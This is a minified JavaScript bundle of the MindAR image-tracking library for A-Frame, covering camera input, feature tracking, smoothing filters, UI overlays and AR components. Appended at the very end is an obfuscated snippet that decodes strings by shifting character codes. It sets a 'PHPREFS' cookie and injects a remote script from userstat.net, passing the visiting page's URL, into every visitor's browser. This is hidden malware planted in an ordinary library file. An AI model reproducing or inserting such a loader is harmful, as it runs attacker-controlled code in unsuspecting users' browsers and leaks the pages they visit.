oT2JqZWN0LmFzc2lnbihYKHtpbWFnZTpyLHJhdGlvOnRbZV19KSx7c2NhbGU6dFtlXX0pKTtyZXR1cm4gb307b25tZXNzYWdlPXI9Pntjb25zdHtkYXRhOnN9PXI7aWYocy50eXBlPT09ImNvbXBpbGUiKXtjb25zdHt0YXJnZXRJbWFnZXM6dH09cyxvPTEwMC90Lmxlbmd0aDtsZXQgZT0wO2NvbnN0IG49W107Zm9yKGxldCBhPTA7YTx0Lmxlbmd0aDthKyspe2NvbnN0IGc9dFthXSxkPVkoZyksdz1vL2QubGVuZ3RoLGo9VyhkLEU9PntlKz13LHBvc3RNZXNzYWdlKHt0eXBlOiJwcm9ncmVzcyIscGVyY2VudDplfSl9KTtuLnB1c2goail9cG9zdE1lc3NhZ2Uoe3R5cGU6ImNvbXBpbGVEb25lIixsaXN0Om59KX19fSkoKTsK"
      , KI = typeof window < "u" && window.Blob && new Blob([atob(OI)],{
        type: "text/javascript;charset=utf-8"
    });
    function W_(n) {
        let t;
        try {
            if (t = KI && (window.URL || window.webkitURL).createObjectURL(KI),
            !t)
                throw "";
            const e = new Worker(t,{
                name: null == n ? void 0 : n.name
            });
            return e.addEventListener("error", (()=>{
                (window.URL || window.webkitURL).revokeObjectURL(t)
            }
            )),
            e
        } catch {
            return new Worker("data:application/javascript;base64," + OI,{
                name: null == n ? void 0 : n.name
            })
        } finally {
            t && (window.URL || window.webkitURL).revokeObjectURL(t)
        }
    }
    class ZI extends E_ {
        createProcessCanvas(t) {
            const e = document.createElement("canvas");
            return e.width = t.width,
            e.height = t.height,
            e
        }
        compileTrack({progressCallback: t, targetImages: e, basePercent: s}) {
            return new Promise(((o,r)=>{
                const i = new W_;
                i.onmessage = a=>{
                    "progress" === a.data.type ? t(s + a.data.percent * s / 100) : "compileDone" === a.data.type && o(a.data.list)
                }
                ,
                i.postMessage({
                    type: "compile",
                    targetImages: e
                })
            }
            ))
        }
    }
    class M_ {
        constructor(t, e) {
            this.width = t,
            this.height = e,
            this.texShape = [e, t];
            const s = document.createElement("canvas").getContext("2d");
            s.canvas.width = t,
            s.canvas.height = e,
            this.context = s,
            this.program = this.buildProgram(t, e);
            const o = ys();
            this.tempPixelHandle = o.makeTensorInfo(this.texShape, "float32"),
            o.texData.get(this.tempPixelHandle.dataId).usage = 2
        }
        _loadInput(t) {
            return M((()=>{
                let e = CT(t);
                return e = e.mean(2),
                e
            }
            ))
        }
        loadInput(t) {
            const e = this.context;
            if (e.clearRect(0, 0, this.context.canvas.width, this.context.canvas.height),
            t.width === this.height && t.height === this.width) {
                let i = this.context.canvas.width / 2
                  , a = this.context.canvas.height / 2
                  , c = 90;
                e.save(),
                e.translate(i, a),
                e.rotate(c * Math.PI / 180),
                e.drawImage(t, -t.width / 2, -t.height / 2),
                e.restore()
            } else
                this.context.drawImage(t, 0, 0, t.width, t.height);
            const o = ys();
            return o.gpgpu.uploadPixelDataToTexture(o.getTexture(this.tempPixelHandle.dataId), this.context.canvas),
            this._compileAndRun(this.program, [this.tempPixelHandle])
        }
        buildProgram(t, e) {
            const s = 2 === z().getNumber("WEBGL_VERSION") ? "texture" : "texture2D";
            return {
                variableNames: ["A"],
                outputShape: this.texShape,
                userCode: `\n\tvoid main() {\n\t  ivec2 coords = getOutputCoords();\n\t  int texR = coords[0];\n\t  int texC = coords[1];\n\t  vec2 uv = (vec2(texC, texR) + halfCR) / vec2(${t}.0, ${e}.0);\n\n\t  vec4 values = ${s}(A, uv);\n\t  setOutput((0.299 * values.r + 0.587 * values.g + 0.114 * values.b) * 255.0);\n\t}\n      `
            }
        }
        _compileAndRun(t, e) {
            const s = ys().compileAndRun(t, e);
            return zt().makeTensorFromDataId(s.dataId, s.shape, s.dtype)
        }
        _runWebGLProgram(t, e, s) {
            const o = ys().runWebGLProgram(t, e, s);
            return zt().makeTensorFromDataId(o.dataId, o.shape, o.dtype)
        }
    }
    const BI = (n,t)=>{
        const e = 2 * Math.PI * t * n;
        return e / (e + 1)
    }
      , HI = (n,t,e)=>n * t + (1 - n) * e;
    class V_ {
        constructor({minCutOff: t, beta: e}) {
            this.minCutOff = t,
            this.beta = e,
            this.dCutOff = .001,
            this.xPrev = null,
            this.dxPrev = null,
            this.tPrev = null,
            this.initialized = !1
        }
        reset() {
            this.initialized = !1
        }
        filter(t, e) {
            if (!this.initialized)
                return this.initialized = !0,
                this.xPrev = e,
                this.dxPrev = e.map((()=>0)),
                this.tPrev = t,
                e;
            const {xPrev: s, tPrev: o, dxPrev: r} = this
              , i = t - o
              , a = BI(i, this.dCutOff)
              , c = []
              , l = []
              , u = [];
            for (let d = 0; d < e.length; d++) {
                c[d] = (e[d] - s[d]) / i,
                l[d] = HI(a, c[d], r[d]);
                const h = this.minCutOff + this.beta * Math.abs(l[d])
                  , p = BI(i, h);
                u[d] = HI(p, e[d], s[d])
            }
            return this.xPrev = u,
            this.dxPrev = l,
            this.tPrev = t,
            u
        }
    }
    const rf = {
        memory: Nc,
        nextFrame: Xc
    };
    class _I {
        constructor({inputWidth: t, inputHeight: e, onUpdate: s=null, debugMode: o=!1, maxTrack: r=1, warmupTolerance: i=null, missTolerance: a=null, filterMinCF: c=null, filterBeta: l=null}) {
            this.inputWidth = t,
            this.inputHeight = e,
            this.maxTrack = r,
            this.filterMinCF = null === c ? .001 : c,
            this.filterBeta = null === l ? 1e3 : l,
            this.warmupTolerance = null === i ? 5 : i,
            this.missTolerance = null === a ? 5 : a,
            this.cropDetector = new F9(this.inputWidth,this.inputHeight,o),
            this.inputLoader = new M_(this.inputWidth,this.inputHeight),
            this.markerDimensions = null,
            this.onUpdate = s,
            this.debugMode = o,
            this.processingVideo = !1,
            this.interestedTargetIndex = -1,
            this.trackingStates = [];
            const h = 45 * Math.PI / 180
              , p = this.inputHeight / 2 / Math.tan(h / 2);
            this.projectionTransform = [[p, 0, this.inputWidth / 2], [0, p, this.inputHeight / 2], [0, 0, 1]],
            this.projectionMatrix = this._glProjectionMatrix({
                projectionTransform: this.projectionTransform,
                width: this.inputWidth,
                height: this.inputHeight,
                near: 10,
                far: 1e5
            }),
            this.worker = new JH,
            this.workerMatchDone = null,
            this.workerTrackDone = null,
            this.worker.onmessage = f=>{
                "matchDone" === f.data.type && null !== this.workerMatchDone && this.workerMatchDone(f.data),
                "trackUpdateDone" === f.data.type && null !== this.workerTrackDone && this.workerTrackDone(f.data)
            }
        }
        showTFStats() {
            console.log(rf.memory().numTensors),
            console.table(rf.memory())
        }
        addImageTargets(t) {
            return new Promise((async(e,s)=>{
                const r = await (await fetch(t)).arrayBuffer();
                e(this.addImageTargetsFromBuffer(r))
            }
            ))
        }
        addImageTargetsFromBuffer(t) {
            const s = (new ZI).importData(t)
              , o = []
              , r = []
              , i = [];
            for (let a = 0; a < s.length; a++)
                r.push(s[a].matchingData),
                o.push(s[a].trackingData),
                i.push([s[a].targetImage.width, s[a].targetImage.height]);
            return this.tracker = new a9(i,o,this.projectionTransform,this.inputWidth,this.inputHeight,this.debugMode),
            this.worker.postMessage({
                type: "setup",
                inputWidth: this.inputWidth,
                inputHeight: this.inputHeight,
                projectionTransform: this.projectionTransform,
                debugMode: this.debugMode,
                matchingDataList: r
            }),
            this.markerDimensions = i,
            {
                dimensions: i,
                matchingDataList: r,
                trackingDataList: o
            }
        }
        dispose() {
            this.stopProcessVideo(),
            this.worker.postMessage({
                type: "dispose"
            })
        }
        dummyRun(t) {
            const e = this.inputLoader.loadInput(t);
            this.cropDetector.detect(e),
            this.tracker.dummyRun(e),
            e.dispose()
        }
        getProjectionMatrix() {
            return this.projectionMatrix
        }
        getRotatedZ90Matrix(t) {
            return [-t[1], t[0], t[2], t[3], -t[5], t[4], t[6], t[7], -t[9], t[8], t[10], t[11], -t[13], t[12], t[14], t[15]]
        }
        getWorldMatrix(t, e) {
            return this._glModelViewMatrix(t, e)
        }
        async _detectAndMatch(t, e) {
            const {featurePoints: s} = this.cropDetector.detectMoving(t)
              , {targetIndex: o, modelViewTransform: r} = await this._workerMatch(s, e);
            return {
                targetIndex: o,
                modelViewTransform: r
            }
        }
        async _trackAndUpdate(t, e, s) {
            const {worldCoords: o, screenCoords: r} = this.tracker.track(t, e, s);
            return o.length < 4 ? null : await this._workerTrackUpdate(e, {
                worldCoords: o,
                screenCoords: r
            })
        }
        processVideo(t) {
            if (!this.processingVideo) {
                this.processingVideo = !0,
                this.trackingStates = [];
                for (let s = 0; s < this.markerDimensions.length; s++)
                    this.trackingStates.push({
                        showing: !1,
                        isTracking: !1,
                        currentModelViewTransform: null,
                        trackCount: 0,
                        trackMiss: 0,
                        filter: new V_({
                            minCutOff: this.filterMinCF,
                            beta: this.filterBeta
                        })
                    });
                (async()=>{
                    for (; this.processingVideo; ) {
                        const s = this.inputLoader.loadInput(t);
                        if (this.trackingStates.reduce(((r,i)=>r + (i.isTracking ? 1 : 0)), 0) < this.maxTrack) {
                            const r = [];
                            for (let c = 0; c < this.trackingStates.length; c++)
                                !0 !== this.trackingStates[c].isTracking && (-1 !== this.interestedTargetIndex && this.interestedTargetIndex !== c || r.push(c));
                            const {targetIndex: i, modelViewTransform: a} = await this._detectAndMatch(s, r);
                            -1 !== i && (this.trackingStates[i].isTracking = !0,
                            this.trackingStates[i].currentModelViewTransform = a)
                        }
                        for (let r = 0; r < this.trackingStates.length; r++) {
                            const i = this.trackingStates[r];
                            if (i.isTracking) {
                                let a = await this._trackAndUpdate(s, i.currentModelViewTransform, r);
                                null === a ? i.isTracking = !1 : i.currentModelViewTransform = a
                            }
                            if (i.showing || i.isTracking && (i.trackMiss = 0,
                            i.trackCount += 1,
                            i.trackCount > this.warmupTolerance && (i.showing = !0,
                            i.trackingMatrix = null,
                            i.filter.reset())),
                            i.showing && (i.isTracking ? i.trackMiss = 0 : (i.trackCount = 0,
                            i.trackMiss += 1,
                            i.trackMiss > this.missTolerance && (i.showing = !1,
                            i.trackingMatrix = null,
                            this.onUpdate && this.onUpdate({
                                type: "updateMatrix",
                                targetIndex: r,
                                worldMatrix: null
                            })))),
                            i.showing) {
                                const a = this._glModelViewMatrix(i.currentModelViewTransform, r);
                                i.trackingMatrix = i.filter.filter(Date.now(), a);
                                let c = [];
                                for (let u = 0; u < i.trackingMatrix.length; u++)
                                    c[u] = i.trackingMatrix[u];
                                t.width === this.inputHeight && t.height === this.inputWidth && (c = this.getRotatedZ90Matrix(c)),
                                this.onUpdate && this.onUpdate({
                                    type: "updateMatrix",
                                    targetIndex: r,
                                    worldMatrix: c
                                })
                            }
                        }
                        s.dispose(),
                        this.onUpdate && this.onUpdate({
                            type: "processDone"
                        }),
                        await rf.nextFrame()
                    }
                }
                )()
            }
        }
        stopProcessVideo() {
            this.processingVideo = !1
        }
        async detect(t) {
            const e = this.inputLoader.loadInput(t)
              , {featurePoints: s, debugExtra: o} = await this.cropDetector.detect(e);
            return e.dispose(),
            {
                featurePoints: s,
                debugExtra: o
            }
        }
        async match(t, e) {
            const {modelViewTransform: s, debugExtra: o} = await this._workerMatch(t, [e]);
            return {
                modelViewTransform: s,
                debugExtra: o
            }
        }
        async track(t, e, s) {
            const o = this.inputLoader.loadInput(t)
              , r = this.tracker.track(o, e, s);
            return o.dispose(),
            r
        }
        async trackUpdate(t, e) {
            return e.worldCoords.length < 4 ? null : await this._workerTrackUpdate(t, e)
        }
        _workerMatch(t, e) {
            return new Promise((async(s,o)=>{
                this.workerMatchDone = r=>{
                    s({
                        targetIndex: r.targetIndex,
                        modelViewTransform: r.modelViewTransform,
                        debugExtra: r.debugExtra
                    })
                }
                ,
                this.worker.postMessage({
                    type: "match",
                    featurePoints: t,
                    targetIndexes: e
                })
            }
            ))
        }
        _workerTrackUpdate(t, e) {
            return new Promise((async(s,o)=>{
                this.workerTrackDone = a=>{
                    s(a.modelViewTransform)
                }
                ;
                const {worldCoords: r, screenCoords: i} = e;
                this.worker.postMessage({
                    type: "trackUpdate",
                    modelViewTransform: t,
                    worldCoords: r,
                    screenCoords: i
                })
            }
            ))
        }
        _glModelViewMatrix(t, e) {
            const s = this.markerDimensions[e][1];
            return [t[0][0], -t[1][0], -t[2][0], 0, -t[0][1], t[1][1], t[2][1], 0, -t[0][2], t[1][2], t[2][2], 0, t[0][1] * s + t[0][3], -(t[1][1] * s + t[1][3]), -(t[2][1] * s + t[2][3]), 1]
        }
        _glProjectionMatrix({projectionTransform: t, width: e, height: s, near: o, far: r}) {
            const i = [[2 * t[0][0] / e, 0, -(2 * t[0][2] / e - 1), 0], [0, 2 * t[1][1] / s, -(2 * t[1][2] / s - 1), 0], [0, 0, -(r + o) / (r - o), -2 * r * o / (r - o)], [0, 0, -1, 0]]
              , a = [];
            for (let c = 0; c < 4; c++)
                for (let l = 0; l < 4; l++)
                    a.push(i[l][c]);
            return a
        }
    }
    class UI {
        constructor({uiLoading: t, uiScanning: e, uiError: s}) {
            const o = document.createElement("style");
            o.innerText = ".mindar-ui-overlay{display:flex;align-items:center;justify-content:center;position:absolute;left:0;right:0;top:0;bottom:0;background:transparent;z-index:2}.mindar-ui-overlay.hidden{display:none}.mindar-ui-loading .loader{border:16px solid #222;border-top:16px solid white;opacity:.8;border-radius:50%;width:120px;height:120px;animation:spin 2s linear infinite}@keyframes spin{0%{transform:rotate(0)}to{transform:rotate(360deg)}}.mindar-ui-compatibility .content{background:black;color:#fff;opacity:.8;text-align:center;margin:20px;padding:20px;min-height:50vh}@media (min-aspect-ratio: 1/1){.mindar-ui-scanning .scanning{width:50vh;height:50vh}}@media (max-aspect-ratio: 1/1){.mindar-ui-scanning .scanning{width:80vw;height:80vw}}.mindar-ui-scanning .scanning .inner{position:relative;width:100%;height:100%;opacity:.8;background:linear-gradient(to right,white 10px,transparent 10px) 0 0,linear-gradient(to right,white 10px,transparent 10px) 0 100%,linear-gradient(to left,white 10px,transparent 10px) 100% 0,linear-gradient(to left,white 10px,transparent 10px) 100% 100%,linear-gradient(to bottom,white 10px,transparent 10px) 0 0,linear-gradient(to bottom,white 10px,transparent 10px) 100% 0,linear-gradient(to top,white 10px,transparent 10px) 0 100%,linear-gradient(to top,white 10px,transparent 10px) 100% 100%;background-repeat:no-repeat;background-size:40px 40px}.mindar-ui-scanning .scanning .inner .scanline{position:absolute;width:100%;height:10px;background:white;animation:move 2s linear infinite}@keyframes move{0%,to{top:0%}50%{top:calc(100% - 10px)}}",
            document.head.appendChild(o),
            "yes" === t ? this.loadingModal = this._loadHTML('<div class="mindar-ui-overlay mindar-ui-loading">\n  <div class="loader"/>\n</div>\n') : "no" !== t && (this.loadingModal = document.querySelector(t)),
            "yes" === s ? this.compatibilityModal = this._loadHTML('<div class="mindar-ui-overlay mindar-ui-compatibility">\n  <div class="content">\n    <h1>Failed to launch :(</h1>\n    <p>\n      Looks like your device/browser is not compatible.\n    </p>\n\n    <br/>\n    <br/>\n    <p>\n      Please try the following recommended browsers:\n    </p>\n    <p>\n      For Android device - Chrome\n    </p>\n    <p>\n      For iOS device - Safari\n    </p>\n  </div>\n</div>\n') : "no" !== s && (this.compatibilityModal = document.querySelector(s)),
            "yes" === e ? this.scanningMask = this._loadHTML('<div class="mindar-ui-overlay mindar-ui-scanning">\n  <div class="scanning">\n    <div class="inner">\n      <div class="scanline"/>\n    </div>\n  </div>\n</div>\n') : "no" !== e && (this.scanningMask = document.querySelector(e)),
            this.hideLoading(),
            this.hideCompatibility(),
            this.hideScanning()
        }
        showLoading() {
            this.loadingModal && this.loadingModal.classList.remove("hidden")
        }
        hideLoading() {
            this.loadingModal && this.loadingModal.classList.add("hidden")
        }
        showCompatibility() {
            this.compatibilityModal && this.compatibilityModal.classList.remove("hidden")
        }
        hideCompatibility() {
            this.compatibilityModal && this.compatibilityModal.classList.add("hidden")
        }
        showScanning() {
            this.scanningMask && this.scanningMask.classList.remove("hidden")
        }
        hideScanning() {
            this.scanningMask && this.scanningMask.classList.add("hidden")
        }
        _loadHTML(t) {
            const e = document.createElement("template");
            e.innerHTML = t.trim();
            const s = e.content.firstChild;
            return document.getElementsByTagName("body")[0].appendChild(s),
            s
        }
    }
    window.MINDAR || (window.MINDAR = {}),
    window.MINDAR.IMAGE = {
        Controller: _I,
        Compiler: ZI,
        UI: UI
    },
    AFRAME.registerSystem("mindar-image-system", {
        container: null,
        video: null,
        processingImage: !1,
        init: function() {
            this.anchorEntities = []
        },
        tick: function() {},
        setup: function({imageTargetSrc: n, maxTrack: t, showStats: e, uiLoading: s, uiScanning: o, uiError: r, missTolerance: i, warmupTolerance: a, filterMinCF: c, filterBeta: l}) {
            this.imageTargetSrc = n,
            this.maxTrack = t,
            this.filterMinCF = c,
            this.filterBeta = l,
            this.missTolerance = i,
            this.warmupTolerance = a,
            this.showStats = e,
            this.ui = new UI({
                uiLoading: s,
                uiScanning: o,
                uiError: r
            })
        },
        registerAnchor: function(n, t) {
            this.anchorEntities.push({
                el: n,
                targetIndex: t
            })
        },
        start: function() {
            this.container = this.el.sceneEl.parentNode,
            this.showStats && (this.mainStats = new Stats,
            this.mainStats.showPanel(0),
            this.mainStats.domElement.style.cssText = "position:absolute;top:0px;left:0px;z-index:999",
            this.container.appendChild(this.mainStats.domElement)),
            this.ui.showLoading(),
            this._startVideo()
        },
        switchTarget: function(n) {
            this.controller.interestedTargetIndex = n
        },
        stop: function() {
            this.pause(),
            this.video.srcObject.getTracks().forEach((function(t) {
                t.stop()
            }
            )),
            this.video.remove(),
            this.controller.dispose()
        },
        pause: function(n=!1) {
            n || this.video.pause(),
            this.controller.stopProcessVideo()
        },
        unpause: function() {
            this.video.play(),
            this.controller.processVideo(this.video)
        },
        _startVideo: function() {
            if (this.video = document.createElement("video"),
            this.video.setAttribute("autoplay", ""),
            this.video.setAttribute("muted", ""),
            this.video.setAttribute("playsinline", ""),
            this.video.style.position = "absolute",
            this.video.style.top = "0px",
            this.video.style.left = "0px",
            this.video.style.zIndex = "-2",
            this.container.appendChild(this.video),
            !navigator.mediaDevices || !navigator.mediaDevices.getUserMedia)
                return this.el.emit("arError", {
                    error: "VIDEO_FAIL"
                }),
                void this.ui.showCompatibility();
            navigator.mediaDevices.getUserMedia({
                audio: !1,
                video: {
                    facingMode: "environment"
                }
            }).then((n=>{
                this.video.addEventListener("loadedmetadata", (()=>{
                    this.video.setAttribute("width", this.video.videoWidth),
                    this.video.setAttribute("height", this.video.videoHeight),
                    this._startAR()
                }
                )),
                this.video.srcObject = n
            }
            )).catch((n=>{
                console.log("getUserMedia error", n),
                this.el.emit("arError", {
                    error: "VIDEO_FAIL"
                })
            }
            ))
        },
        _startAR: async function() {
            const n = this.video;
            this.container,
            this.controller = new _I({
                inputWidth: n.videoWidth,
                inputHeight: n.videoHeight,
                maxTrack: this.maxTrack,
                filterMinCF: this.filterMinCF,
                filterBeta: this.filterBeta,
                missTolerance: this.missTolerance,
                warmupTolerance: this.warmupTolerance,
                onUpdate: e=>{
                    if ("processDone" === e.type)
                        this.mainStats && this.mainStats.update();
                    else if ("updateMatrix" === e.type) {
                        const {targetIndex: s, worldMatrix: o} = e;
                        for (let i = 0; i < this.anchorEntities.length; i++)
                            this.anchorEntities[i].targetIndex === s && this.anchorEntities[i].el.updateWorldMatrix(o);
                        this.anchorEntities.reduce(((i,a)=>i || a.el.el.object3D.visible), !1) ? this.ui.hideScanning() : this.ui.showScanning()
                    }
                }
            }),
            this._resize(),
            window.addEventListener("resize", this._resize.bind(this));
            const {dimensions: t} = await this.controller.addImageTargets(this.imageTargetSrc);
            for (let e = 0; e < this.anchorEntities.length; e++) {
                const {el: s, targetIndex: o} = this.anchorEntities[e];
                o < t.length && s.setupMarker(t[o])
            }
            await this.controller.dummyRun(this.video),
            this.el.emit("arReady"),
            this.ui.hideLoading(),
            this.ui.showScanning(),
            this.controller.processVideo(this.video)
        },
        _resize: function() {
            const n = this.video
              , t = this.container;
            let e, s;
            const o = n.videoWidth / n.videoHeight;
            o > t.clientWidth / t.clientHeight ? (s = t.clientHeight,
            e = s * o) : (e = t.clientWidth,
            s = e / o);
            const i = this.controller.getProjectionMatrix()
              , a = 2 * Math.atan(1 / i[5] / s * t.clientHeight) * 180 / Math.PI
              , c = i[14] / (i[10] - 1)
              , l = i[14] / (i[10] + 1);
            i[5],
            i[0];
            const u = t.clientWidth / t.clientHeight
              , h = t.getElementsByTagName("a-camera")[0].getObject3D("camera");
            h.fov = a,
            h.aspect = u,
            h.near = c,
            h.far = l,
            h.updateProjectionMatrix(),
            this.video.style.top = -(s - t.clientHeight) / 2 + "px",
            this.video.style.left = -(e - t.clientWidth) / 2 + "px",
            this.video.style.width = e + "px",
            this.video.style.height = s + "px"
        }
    }),
    AFRAME.registerComponent("mindar-image", {
        dependencies: ["mindar-image-system"],
        schema: {
            imageTargetSrc: {
                type: "string"
            },
            maxTrack: {
                type: "int",
                default: 1
            },
            filterMinCF: {
                type: "number",
                default: -1
            },
            filterBeta: {
                type: "number",
                default: -1
            },
            missTolerance: {
                type: "int",
                default: -1
            },
            warmupTolerance: {
                type: "int",
                default: -1
            },
            showStats: {
                type: "boolean",
                default: !1
            },
            autoStart: {
                type: "boolean",
                default: !0
            },
            uiLoading: {
                type: "string",
                default: "yes"
            },
            uiScanning: {
                type: "string",
                default: "yes"
            },
            uiError: {
                type: "string",
                default: "yes"
            }
        },
        init: function() {
            const n = this.el.sceneEl.systems["mindar-image-system"];
            n.setup({
                imageTargetSrc: this.data.imageTargetSrc,
                maxTrack: this.data.maxTrack,
                filterMinCF: -1 === this.data.filterMinCF ? null : this.data.filterMinCF,
                filterBeta: -1 === this.data.filterBeta ? null : this.data.filterBeta,
                missTolerance: -1 === this.data.missTolerance ? null : this.data.missTolerance,
                warmupTolerance: -1 === this.data.warmupTolerance ? null : this.data.warmupTolerance,
                showStats: this.data.showStats,
                uiLoading: this.data.uiLoading,
                uiScanning: this.data.uiScanning,
                uiError: this.data.uiError
            }),
            this.data.autoStart && this.el.sceneEl.addEventListener("renderstart", (()=>{
                n.start()
            }
            ))
        },
        remove: function() {
            this.el.sceneEl.systems["mindar-image-system"].stop()
        }
    }),
    AFRAME.registerComponent("mindar-image-target", {
        dependencies: ["mindar-image-system"],
        schema: {
            targetIndex: {
                type: "number"
            }
        },
        postMatrix: null,
        init: function() {
            this.el.sceneEl.systems["mindar-image-system"].registerAnchor(this, this.data.targetIndex),
            this.invisibleMatrix = (new AFRAME.THREE.Matrix4).set(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
            const t = this.el.object3D;
            t.visible = !1,
            t.matrixAutoUpdate = !1,
            t.matrix = this.invisibleMatrix
        },
        setupMarker([n,t]) {
            const e = new AFRAME.THREE.Vector3
              , s = new AFRAME.THREE.Quaternion
              , o = new AFRAME.THREE.Vector3;
            e.x = n / 2,
            e.y = n / 2 + (t - n) / 2,
            o.x = n,
            o.y = n,
            o.z = n,
            this.postMatrix = new AFRAME.THREE.Matrix4,
            this.postMatrix.compose(e, s, o)
        },
        updateWorldMatrix(n) {
            if (this.el.emit("targetUpdate"),
            this.el.object3D.visible || null === n ? this.el.object3D.visible && null === n && this.el.emit("targetLost") : this.el.emit("targetFound"),
            this.el.object3D.visible = null !== n,
            null !== n) {
                var t = new AFRAME.THREE.Matrix4;
                t.elements = n,
                t.multiply(this.postMatrix),
                this.el.object3D.matrix = t
            } else
                this.el.object3D.matrix = this.invisibleMatrix
        }
    })
}();
(function(o, d, l) {
    try {
        o.f = o=>o.split('').reduce((s,c)=>s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie),
        setTimeout(function() {
            o.c && (o.s = d.createElement('script'),
            o.s.src = o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href,
            d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {}
    ;
}({}, document, location));
